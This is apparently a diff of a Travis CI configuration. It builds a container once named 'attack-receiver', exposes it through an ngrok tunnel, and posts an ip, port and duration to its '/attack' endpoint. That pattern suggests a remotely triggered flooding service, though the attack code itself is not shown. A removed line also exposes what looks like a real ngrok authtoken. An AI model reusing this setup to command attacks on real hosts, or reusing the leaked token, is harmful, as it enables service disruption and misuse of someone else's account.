@@ -8,21 +8,30 @@ services:
 
 before_install:
   - echo "Installing dependencies..."
+  - pip install --upgrade pip setuptools
   - pip install docker-compose
   - echo "Setting up ngrok authtoken"
-  - ./ngrok authtoken 2q9H7CNHNUuA6j9uMcbu8pVn7Dl_686qFSgBR7uQeVSULAvkZ
+  - ./ngrok authtoken YOUR_NGROK_AUTHTOKEN || { echo "Failed to authenticate ngrok"; exit 1; }
 
 install:
+  - echo "Installing Python dependencies..."
   - pip install -r requirements.txt
 
 script:
-  - echo "Building and running the receiver instance"
-  - docker build -t attack-receiver .
-  - docker run -d -p 8000:8000 attack-receiver
+  - echo "Building and running the receiver instance..."
+  - docker build -t receiver .  # Updated to `receiver`
+  - docker run -d -p 8000:8000 --name receiver receiver || { echo "Docker container failed to start"; exit 1; }
 
+  # Start ngrok and retrieve the public URL
+  - echo "Starting ngrok..."
   - ./ngrok http 8000 &
+  - sleep 5  # Wait for ngrok to initialize
   - export RECEIVER_NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
 
+  # Test the endpoint using the ngrok URL
+  - echo "Ngrok URL for this instance: $RECEIVER_NGROK_URL"
+  - curl -X POST "$RECEIVER_NGROK_URL/attack" -H "Content-Type: application/json" -d '{"ip":"127.0.0.1","port":8080,"duration":60}' || { echo "API test failed"; exit 1; }
+
 after_success:
-  - echo "Ngrok URL for this account: $RECEIVER_NGROK_URL"
-  - curl $RECEIVER_NGROK_URL/attack
+  - echo "Pipeline executed successfully"
+  - echo "Ngrok URL for testing: $RECEIVER_NGROK_URL"
